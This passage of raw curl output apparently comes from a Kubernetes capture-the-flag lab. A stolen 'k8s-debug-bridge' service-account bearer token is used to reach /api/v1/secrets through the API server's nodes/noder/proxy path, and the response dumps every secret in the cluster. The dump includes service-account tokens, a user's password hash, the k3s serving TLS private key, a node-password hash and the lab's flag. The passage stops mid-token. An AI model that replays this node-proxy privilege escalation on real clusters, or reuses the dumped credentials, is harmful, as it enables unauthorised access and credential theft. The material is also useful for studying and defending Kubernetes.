                "f:Port": {}
              }
            }
          }
        },
        "subresource": "status"
      }
    ]
  },
  "spec": {
    "podCIDR": "10.42.0.0/24",
    "podCIDRs": [
      "10.42.0.0/24"
    ]
  },
  "status": {
    "capacity": {
      "cpu": "1",
      "ephemeral-storage": "1253528Ki",
      "hugepages-1Gi": "0",
      "hugepages-2Mi": "0",
      "memory": "1011268Ki",
      "pods": "110"
    },
    "allocatable": {
      "cpu": "1",
      "ephemeral-storage": "1219432038",
      "hugepages-1Gi": "0",
      "hugepages-2Mi": "0",
      "memory": "1011268Ki",
      "pods": "110"
    },
    "conditions": [
      {
        "type": "MemoryPressure",
        "status": "False",
        "lastHeartbeatTime": "2026-04-18T18:20:18Z",
        "lastTransitionTime": "2025-10-26T19:58:53Z",
        "reason": "KubeletHasSufficientMemory",
        "message": "kubelet has sufficient memory available"
      },
      {
        "type": "DiskPressure",
        "status": "False",
        "lastHeartbeatTime": "2026-04-18T18:20:18Z",
        "lastTransitionTime": "2025-10-26T19:58:53Z",
        "reason": "KubeletHasNoDiskPressure",
        "message": "kubelet has no disk pressure"
      },
      {
        "type": "PIDPressure",
        "status": "False",
        "lastHeartbeatTime": "2026-04-18T18:20:18Z",
        "lastTransitionTime": "2025-10-26T19:58:53Z",
        "reason": "KubeletHasSufficientPID",
        "message": "kubelet has sufficient PID available"
      },
      {
        "type": "Ready",
        "status": "True",
        "lastHeartbeatTime": "2026-04-18T18:20:18Z",
        "lastTransitionTime": "2025-10-26T19:58:54Z",
        "reason": "KubeletReady",
        "message": "kubelet is posting ready status"
      }
    ],
    "addresses": [
      {
        "type": "InternalIP",
        "address": "172.30.0.2"
      },
      {
        "type": "Hostname",
        "address": "noder"
      }
    ],
    "daemonEndpoints": {
      "kubeletEndpoint": {
        "Port": 6443
      }
    },
    "nodeInfo": {
      "machineID": "",
      "systemUUID": "",
      "bootID": "0aa9a8e0-c707-41a4-838e-1af5861bf1a6",
      "kernelVersion": "6.1.128",
      "osImage": "K3s v1.31.5+k3s1",
      "containerRuntimeVersion": "containerd://1.7.23-k3s2",
      "kubeletVersion": "v1.31.5+k3s1",
      "kubeProxyVersion": "v1.31.5+k3s1",
      "operatingSystem": "linux",
      "architecture": "amd64"
    },
    "images": [
      {
        "names": [
          "hustlehub.azurecr.io/test@sha256:6c49ed1562fc0394f3e50549895776c5cac96524b011b8c4a26dea211e9d4610",
          "hustlehub.azurecr.io/test:latest"
        ],
        "sizeBytes": 46615194
      },
      {
        "names": [
          "docker.io/rancher/mirrored-coredns-coredns@sha256:82979ddf442c593027a57239ad90616deb874e90c365d1a96ad508c2104bdea5",
          "docker.io/rancher/mirrored-coredns-coredns:1.12.0"
        ],
        "sizeBytes": 20938299
      },
      {
        "names": [
          "morehustle.azurecr.io/website@sha256:37239513cb01e03360822aa638ef98295b165d5a4d2f0dd5f55de40ba68b19e0",
          "morehustle.azurecr.io/website:latest"
        ],
        "sizeBytes": 15031636
      },
      {
        "names": [
          "hustlehub.azurecr.io/k8s-debug-bridge@sha256:0ed2d53c35dc594b40217506326e2f099dc8823fa5838a65736bfce6f1b0115f",
          "hustlehub.azurecr.io/k8s-debug-bridge:latest"
        ],
        "sizeBytes": 6031503
      },
      {
        "names": [
          "docker.io/rancher/mirrored-pause:3.6"
        ],
        "sizeBytes": 685866
      }
    ]
  }
}*   Trying 172.30.0.2:6443...
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Request CERT (13):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Certificate (11):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / id-ecPublicKey
* ALPN: server accepted h2
* Server certificate:
*  subject: O=k3s; CN=k3s
*  start date: Oct 26 19:58:45 2025 GMT
*  expire date: Oct 26 19:58:45 2026 GMT
*  issuer: CN=k3s-server-ca@1761508725
*  SSL certificate verify result: self-signed certificate in certificate chain (19), continuing anyway.
*   Certificate level 0: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
*   Certificate level 1: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
* Connected to 172.30.0.2 (172.30.0.2) port 6443
* using HTTP/2
* [HTTP/2] [1] OPENED stream for https://172.30.0.2:6443/api/v1/nodes/noder/proxy/api/v1/secrets
* [HTTP/2] [1] [:method: GET]
* [HTTP/2] [1] [:scheme: https]
* [HTTP/2] [1] [:authority: 172.30.0.2:6443]
* [HTTP/2] [1] [:path: /api/v1/nodes/noder/proxy/api/v1/secrets]
* [HTTP/2] [1] [user-agent: curl/8.12.1]
* [HTTP/2] [1] [accept: */*]
* [HTTP/2] [1] [authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjVjWHc0NnVkX0RVeHpLb05zenduT2t6WTUxOTJhTmVSSnpuWFQ5VGp5TEEifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJhcHAiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGVidWctYnJpZGdlLXRva2VuIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6Ims4cy1kZWJ1Zy1icmlkZ2UiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI2NWU1MWI5My1kNTU4LTQwMjUtYWU1NC01Y2FkZGM3ZWNjYjgiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6YXBwOms4cy1kZWJ1Zy1icmlkZ2UifQ.FNscGYkuN6VgMtK1jqYKpqYchsnle3PnYoCGzgayRQ0U7NQ4cid-g2oc1SG1bnEHJHkQV0F-ytOdNyDrZ6YKbVHgbV4m7SpTZgrfCbzVgfuuG3d-nUe9dz4fseUkFV4VCIcRvGoKtSJa-tsrWBtPV8q246h6JwjToKj5f7zGdFYsfT-xPArsytNiOjZZ46BPxZ8y2xFDyTZADPH-nVZAoXU7a5SdsPEOuYE5z_s7sz7FtZhOkaRw-vQ3aRYxZ0-um6JDKiLP7XY0S5DT_-3lI2pBWYXMX3t1ZNIaL0IJ1mfc_RLAzzF0NlX_hvUTXZkPr-ZsMY8Rt3fcrHe-X7ZkpA]
> GET /api/v1/nodes/noder/proxy/api/v1/secrets HTTP/2
> Host: 172.30.0.2:6443
> User-Agent: curl/8.12.1
> Accept: */*
> Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjVjWHc0NnVkX0RVeHpLb05zenduT2t6WTUxOTJhTmVSSnpuWFQ5VGp5TEEifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJhcHAiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGVidWctYnJpZGdlLXRva2VuIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6Ims4cy1kZWJ1Zy1icmlkZ2UiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI2NWU1MWI5My1kNTU4LTQwMjUtYWU1NC01Y2FkZGM3ZWNjYjgiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6YXBwOms4cy1kZWJ1Zy1icmlkZ2UifQ.FNscGYkuN6VgMtK1jqYKpqYchsnle3PnYoCGzgayRQ0U7NQ4cid-g2oc1SG1bnEHJHkQV0F-ytOdNyDrZ6YKbVHgbV4m7SpTZgrfCbzVgfuuG3d-nUe9dz4fseUkFV4VCIcRvGoKtSJa-tsrWBtPV8q246h6JwjToKj5f7zGdFYsfT-xPArsytNiOjZZ46BPxZ8y2xFDyTZADPH-nVZAoXU7a5SdsPEOuYE5z_s7sz7FtZhOkaRw-vQ3aRYxZ0-um6JDKiLP7XY0S5DT_-3lI2pBWYXMX3t1ZNIaL0IJ1mfc_RLAzzF0NlX_hvUTXZkPr-ZsMY8Rt3fcrHe-X7ZkpA
> 
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* Request completely sent off
< HTTP/2 200 
< audit-id: 870e1acb-46db-431c-8faa-961602e070d5
< audit-id: d9c6bc5b-7748-498c-adff-2a12c2d16359
< cache-control: no-cache, private
< cache-control: no-cache, private
< content-type: application/json
< date: Sat, 18 Apr 2026 18:24:05 GMT
< 
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "1532"
  },
  "items": [
    {
      "metadata": {
        "name": "debug-bridge-token",
        "namespace": "app",
        "uid": "4b390878-3153-404e-9684-7ef5caf7921d",
        "resourceVersion": "1504",
        "creationTimestamp": "2026-04-18T18:19:52Z",
        "labels": {
          "kubernetes.io/legacy-token-last-used": "2026-04-18"
        },
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Secret\",\"metadata\":{\"annotations\":{\"kubernetes.io/service-account.name\":\"k8s-debug-bridge\"},\"name\":\"debug-bridge-token\",\"namespace\":\"app\"},\"type\":\"kubernetes.io/service-account-token\"}\n",
          "kubernetes.io/service-account.name": "k8s-debug-bridge",
          "kubernetes.io/service-account.uid": "65e51b93-d558-4025-ae54-5caddc7eccb8"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2026-04-18T18:19:52Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {},
                  "f:kubernetes.io/service-account.name": {}
                }
              },
              "f:type": {}
            }
          },
          {
            "manager": "k3s",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2026-04-18T18:22:35Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:ca.crt": {},
                "f:namespace": {},
                "f:token": {}
              },
              "f:metadata": {
                "f:annotations": {
                  "f:kubernetes.io/service-account.uid": {}
                },
                "f:labels": {
                  ".": {},
                  "f:kubernetes.io/legacy-token-last-used": {}
                }
              }
            }
          }
        ]
      },
      "data": {
        "ca.crt": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUzTmpFMU1EZzNNalV3SGhjTk1qVXhNREkyTVRrMU9EUTFXaGNOTXpVeE1ESTBNVGsxT0RRMQpXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUzTmpFMU1EZzNNalV3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFTVXFNQk9NbFBxZ2wzOFpRcHpZQWtScUgrWEhMRXhWN0dyNDVHNCthQTQKaU1pUzRHakd0RlJFcWhtNXlnb2ZTd3dweE54d0RKdXhIcjBOQzIzMjVZNUxvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVXZuT2ZuRURGRDJoZ001ZWlhVm1wCkZnMW9kVE13Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUlnWlI5bVVzWHlmVXlLeWFMR1QwVTgrRkl1azdId05GNDkKM2RsSFV1NkVGbXNDSVFEMGpZekY3WFluWXRnd1NzQU54VWNWcDM5OXFXMjRIYTNGemcrV2ZIK2tBQT09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K",
        "namespace": "YXBw",
        "token": "ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqVmpXSGMwTm5Wa1gwUlZlSHBMYjA1emVuZHVUMnQ2V1RVeE9USmhUbVZTU25wdVdGUTVWR3A1VEVFaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpoY0hBaUxDSnJkV0psY201bGRHVnpMbWx2TDNObGNuWnBZMlZoWTJOdmRXNTBMM05sWTNKbGRDNXVZVzFsSWpvaVpHVmlkV2N0WW5KcFpHZGxMWFJ2YTJWdUlpd2lhM1ZpWlhKdVpYUmxjeTVwYnk5elpYSjJhV05sWVdOamIzVnVkQzl6WlhKMmFXTmxMV0ZqWTI5MWJuUXVibUZ0WlNJNkltczRjeTFrWldKMVp5MWljbWxrWjJVaUxDSnJkV0psY201bGRHVnpMbWx2TDNObGNuWnBZMlZoWTJOdmRXNTBMM05sY25acFkyVXRZV05qYjNWdWRDNTFhV1FpT2lJMk5XVTFNV0k1TXkxa05UVTRMVFF3TWpVdFlXVTFOQzAxWTJGa1pHTTNaV05qWWpnaUxDSnpkV0lpT2lKemVYTjBaVzA2YzJWeWRtbGpaV0ZqWTI5MWJuUTZZWEJ3T21zNGN5MWtaV0oxWnkxaWNtbGtaMlVpZlEuRk5zY0dZa3VONlZnTXRLMWpxWUtwcVljaHNubGUzUG5Zb0NHemdheVJRMFU3TlE0Y2lkLWcyb2MxU0cxYm5FSEpIa1FWMEYteXRPZE55RHJaNllLYlZIZ2JWNG03U3BUWmdyZkNielZnZnV1RzNkLW5VZTlkejRmc2VVa0ZWNFZDSWNSdkdvS3RTSmEtdHNyV0J0UFY4cTI0Nmg2SndqVG9LajVmN3pHZEZZc2ZULXhQQXJzeXROaU9qWlo0NkJQeFo4eTJ4RkR5VFpBRFBILW5WWkFvWFU3YTVTZHNQRU91WUU1el9zN3N6N0Z0WmhPa2FSdy12UTNhUll4WjAtdW02SkRLaUxQN1hZMFM1RFRfLTNsSTJwQldZWE1YM3QxWk5JYUwwSUoxbWZjX1JMQXp6RjBObFhfaHZVVFhaa1ByLVpzTVk4UnQzZmNySGUtWDdaa3BB"
      },
      "type": "kubernetes.io/service-account-token"
    },
    {
      "metadata": {
        "name": "user-johndoe",
        "namespace": "app",
        "uid": "7c7ea084-5053-462b-ae66-b5ac3be553f2",
        "resourceVersion": "410",
        "creationTimestamp": "2025-10-26T19:59:23Z",
        "labels": {
          "app": "hustlehub",
          "component": "auth"
        },
        "managedFields": [
          {
            "manager": "hustlehub",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-10-26T19:59:23Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:createdAt": {},
                "f:passwordHash": {},
                "f:username": {}
              },
              "f:metadata": {
                "f:labels": {
                  ".": {},
                  "f:app": {},
                  "f:component": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "createdAt": "MjAyNS0xMC0yNlQxOTo1OToyM1o=",
        "passwordHash": "JGFyZ29uMmlkJHY9MTkkbT04MTkyLHQ9MSxwPTEkSlk5UVM2WXNXQVVoaVFvK1dIK2FkdyRKYmZIZHYzVGVqd1gyNFN2cy8yazhXMEN0TmNUa1FWSENSaG80OWQ0TW5J",
        "username": "am9obmRvZQ=="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "flag",
        "namespace": "kube-system",
        "uid": "5f1bced7-b60c-4645-a274-569c9cc85192",
        "resourceVersion": "331",
        "creationTimestamp": "2025-10-26T19:59:00Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=\",\"msg\":\"SWYgeW91IGNvbXBsZXRlZCB0aGlzLCBjaGVjayBvdXQgaHR0cHM6Ly96ZXJvZGF5LmNsb3VkIGZvciBhbm90aGVyIGNoYWxsZW5nZSE=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"flag\",\"namespace\":\"kube-system\"},\"type\":\"Opaque\"}\n"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-10-26T19:59:00Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:flag": {},
                "f:msg": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "flag": "V0laX0NURntrOHNfaXNfb25lX2JpZ19wcm94eX0=",
        "msg": "SWYgeW91IGNvbXBsZXRlZCB0aGlzLCBjaGVjayBvdXQgaHR0cHM6Ly96ZXJvZGF5LmNsb3VkIGZvciBhbm90aGVyIGNoYWxsZW5nZSE="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "k3s-serving",
        "namespace": "kube-system",
        "uid": "be661779-9d46-4f46-bc25-831d6d0fcb83",
        "resourceVersion": "225",
        "creationTimestamp": "2025-10-26T19:58:55Z",
        "annotations": {
          "listener.cattle.io/cn-0.0.0.0": "0.0.0.0",
          "listener.cattle.io/cn-10.43.1.1": "10.43.1.1",
          "listener.cattle.io/cn-127.0.0.1": "127.0.0.1",
          "listener.cattle.io/cn-172.30.0.2": "172.30.0.2",
          "listener.cattle.io/cn-__1-f16284": "::1",
          "listener.cattle.io/cn-kubernetes": "kubernetes",
          "listener.cattle.io/cn-kubernetes.default": "kubernetes.default",
          "listener.cattle.io/cn-kubernetes.default.svc": "kubernetes.default.svc",
          "listener.cattle.io/cn-kubernetes.default.svc.cluster.local": "kubernetes.default.svc.cluster.local",
          "listener.cattle.io/cn-localhost": "localhost",
          "listener.cattle.io/cn-noder": "noder",
          "listener.cattle.io/fingerprint": "SHA1=FC6C3CA0CFA6CBA4B6BAC3FE435DE39B5FA962FF"
        },
        "managedFields": [
          {
            "manager": "k3s-supervisor@noder",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-10-26T19:58:55Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:tls.crt": {},
                "f:tls.key": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:listener.cattle.io/cn-0.0.0.0": {},
                  "f:listener.cattle.io/cn-10.43.1.1": {},
                  "f:listener.cattle.io/cn-127.0.0.1": {},
                  "f:listener.cattle.io/cn-172.30.0.2": {},
                  "f:listener.cattle.io/cn-__1-f16284": {},
                  "f:listener.cattle.io/cn-kubernetes": {},
                  "f:listener.cattle.io/cn-kubernetes.default": {},
                  "f:listener.cattle.io/cn-kubernetes.default.svc": {},
                  "f:listener.cattle.io/cn-kubernetes.default.svc.cluster.local": {},
                  "f:listener.cattle.io/cn-localhost": {},
                  "f:listener.cattle.io/cn-noder": {},
                  "f:listener.cattle.io/fingerprint": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "tls.crt": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUNKekNDQWMyZ0F3SUJBZ0lJZmZyb0lvQ3U5NW93Q2dZSUtvWkl6ajBFQXdJd0l6RWhNQjhHQTFVRUF3d1kKYXpOekxYTmxjblpsY2kxallVQXhOell4TlRBNE56STFNQjRYRFRJMU1UQXlOakU1TlRnME5Wb1hEVEkyTVRBeQpOakU1TlRnME5Wb3dIREVNTUFvR0ExVUVDaE1EYXpOek1Rd3dDZ1lEVlFRREV3TnJNM013V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFUbC92WGkzVUhzNS9JL1VnQncvZFdEckhHZ2dYYzJtd3ZGYkFOQzlwdFIKT1d2WEtldEtETDErcCsrTU9HdnZzZUVxdHhBMzFNcVFJUVpyR0JTb0Z2ZUhvNEh4TUlIdU1BNEdBMVVkRHdFQgovd1FFQXdJRm9EQVRCZ05WSFNVRUREQUtCZ2dyQmdFRkJRY0RBVEFmQmdOVkhTTUVHREFXZ0JTK2M1K2NRTVVQCmFHQXpsNkpwV2FrV0RXaDFNekNCcFFZRFZSMFJCSUdkTUlHYWdncHJkV0psY201bGRHVnpnaEpyZFdKbGNtNWwKZEdWekxtUmxabUYxYkhTQ0ZtdDFZbVZ5Ym1WMFpYTXVaR1ZtWVhWc2RDNXpkbU9DSkd0MVltVnlibVYwWlhNdQpaR1ZtWVhWc2RDNXpkbU11WTJ4MWMzUmxjaTVzYjJOaGJJSUpiRzlqWVd4b2IzTjBnZ1Z1YjJSbGNvY0VBQUFBCkFJY0VDaXNCQVljRWZ3QUFBWWNFckI0QUFvY1FBQUFBQUFBQUFBQUFBQUFBQUFBQUFUQUtCZ2dxaGtqT1BRUUQKQWdOSUFEQkZBaUFjcm0wQmgxQ0pXMDhjYlk1VkdBU2toazJRZEJqeFFReGkvT1c3NnF4emJ3SWhBTmlvanhENwplTXNqV1lONWpIV3RhZ3ViY2ExWTM5aDM2TG5MTTBpUW1ldmoKLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQotLS0tLUJFR0lOIENFUlRJRklDQVRFLS0tLS0KTUlJQmR6Q0NBUjJnQXdJQkFnSUJBREFLQmdncWhrak9QUVFEQWpBak1TRXdId1lEVlFRRERCaHJNM010YzJWeQpkbVZ5TFdOaFFERTNOakUxTURnM01qVXdIaGNOTWpVeE1ESTJNVGsxT0RRMVdoY05NelV4TURJME1UazFPRFExCldqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnlkbVZ5TFdOaFFERTNOakUxTURnM01qVXdXVEFUQmdjcWhrak8KUFFJQkJnZ3Foa2pPUFFNQkJ3TkNBQVNVcU1CT01sUHFnbDM4WlFwellBa1JxSCtYSExFeFY3R3I0NUc0K2FBNAppTWlTNEdqR3RGUkVxaG01eWdvZlN3d3B4Tnh3REp1eEhyME5DMjMyNVk1TG8wSXdRREFPQmdOVkhROEJBZjhFCkJBTUNBcVF3RHdZRFZSMFRBUUgvQkFVd0F3RUIvekFkQmdOVkhRNEVGZ1FVdm5PZm5FREZEMmhnTTVlaWFWbXAKRmcxb2RUTXdDZ1lJS29aSXpqMEVBd0lEU0FBd1JRSWdaUjltVXNYeWZVeUt5YUxHVDBVOCtGSXVrN0h3TkY0OQozZGxIVXU2RUZtc0NJUUQwall6RjdYWW5ZdGd3U3NBTnhVY1ZwMzk5cVcyNEhhM0Z6ZytXZkgra0FBPT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=",
        "tls.key": "LS0tLS1CRUdJTiBFQyBQUklWQVRFIEtFWS0tLS0tCk1IY0NBUUVFSUFaMlhONnNscFJoeWUwbjBDdE0wbUcvZUNUTldaWGJudDBhVUtiOXpqWGhvQW9HQ0NxR1NNNDkKQXdFSG9VUURRZ0FFNWY3MTR0MUI3T2Z5UDFJQWNQM1ZnNnh4b0lGM05wc0x4V3dEUXZhYlVUbHIxeW5yU2d5OQpmcWZ2akRocjc3SGhLcmNRTjlUS2tDRUdheGdVcUJiM2h3PT0KLS0tLS1FTkQgRUMgUFJJVkFURSBLRVktLS0tLQo="
      },
      "type": "kubernetes.io/tls"
    },
    {
      "metadata": {
        "name": "noder.node-password.k3s",
        "namespace": "kube-system",
        "uid": "4bac4798-b4ee-43d2-bc89-dd58a4d304c5",
        "resourceVersion": "273",
        "creationTimestamp": "2025-10-26T19:58:58Z",
        "managedFields": [
          {
            "manager": "k3s-supervisor@noder",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-10-26T19:58:58Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:hash": {}
              },
              "f:immutable": {},
              "f:type": {}
            }
          }
        ]
      },
      "immutable": true,
      "data": {
        "hash": "JDE6NzY4OWEyN2UyNDdiOGY3MToxNTo4OjE6eGVjYWlXdkplTWRvYzFNV1pvM0plenQ5UkhQQ0tHaEp5OFdENXN6akRWak10VVFrYnlGNzU3MzY4ZFJocEI0dXVVa0hFUW8xMHQ3dUJWK1FLRnd1dkE="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "exec-token",
        "namespace": "staging",
        "uid": "cd8a7097-90d2-4fbb-9c3f-ed245bad45ac",
        "resourceVersion": "413",
        "creationTimestamp": "2025-10-26T19:59:00Z",
        "labels": {
          "kubernetes.io/legacy-token-last-used": "2026-04-18"
        },
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Secret\",\"metadata\":{\"annotations\":{\"kubernetes.io/service-account.name\":\"exec-sa\"},\"name\":\"exec-token\",\"namespace\":\"staging\"},\"type\":\"kubernetes.io/service-account-token\"}\n",
          "kubernetes.io/service-account.name": "exec-sa",
          "kubernetes.io/service-account.uid": "39824bd3-0316-421b-a9b8-f0146c370e1c"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-10-26T19:59:00Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {},
                  "f:kubernetes.io/service-account.name": {}
                }
              },
              "f:type": {}
            }
          },
          {
            "manager": "k3s",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2026-04-18T17:24:12Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:ca.crt": {},
                "f:namespace": {},
                "f:token": {}
              },
              "f:metadata": {
                "f:annotations": {
                  "f:kubernetes.io/service-account.uid": {}
                },
                "f:labels": {
                  ".": {},
                  "f:kubernetes.io/legacy-token-last-used": {}
                }
              }
            }
          }
        ]
      },
      "data": {
        "ca.crt": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUzTmpFMU1EZzNNalV3SGhjTk1qVXhNREkyTVRrMU9EUTFXaGNOTXpVeE1ESTBNVGsxT0RRMQpXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUzTmpFMU1EZzNNalV3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFTVXFNQk9NbFBxZ2wzOFpRcHpZQWtScUgrWEhMRXhWN0dyNDVHNCthQTQKaU1pUzRHakd0RlJFcWhtNXlnb2ZTd3dweE54d0RKdXhIcjBOQzIzMjVZNUxvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVXZuT2ZuRURGRDJoZ001ZWlhVm1wCkZnMW9kVE13Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUlnWlI5bVVzWHlmVXlLeWFMR1QwVTgrRkl1azdId05GNDkKM2RsSFV1NkVGbXNDSVFEMGpZekY3WFluWXRnd1NzQU54VWNWcDM5OXFXMjRIYTNGemcrV2ZIK2tBQT09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K",
        "namespace": "c3RhZ2luZw==",
        "token": "ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqVmpXSGMwTm5Wa1gwUlZlSHBMYjA1emVuZHVUMnQ2V1RVeE9USmhUbVZTU25wdVdGUTVWR3A1VEVFaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUp6ZEdGbmFXNW5JaXdpYTNWaVpYSnVaWFJsY3k1cGJ5OXpaWEoyYVdObFlXTmpiM1Z1ZEM5elpXTnlaWFF1Ym1GdFpTSTZJbVY0WldNdGRHOXJaVzRpTENKcmRXSmxjbTVsZEdWekxtbHZMM05sY25acFkyVmhZMk52ZFc1MEwzTmxjblpwWTJVdFlXTmpiM1Z1ZEM1dVlXMWxJam9pWlhobFl5MXpZU0lzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJak01T0RJMFltUXpMVEF6TVRZdE5ESXhZaTFoT1dJNExXWXdNVFEyWXpNM01HVXhZeUlzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwemRHRm5hVzVuT21WNFpXTXRjMkVpZlEubjhaVEtQT1ltU1JmcjljbzlKcXZmNXJzM1lUbGNkVHZwcXhOSXdvaFZmakx6RXM4MXNnQ0VWaXlRa1BhVlN4SldWc0tJRU82ZXZhMHVVYVhSSmZyc2lsOE9Hb2lhSGpGNU5mMUZ0MD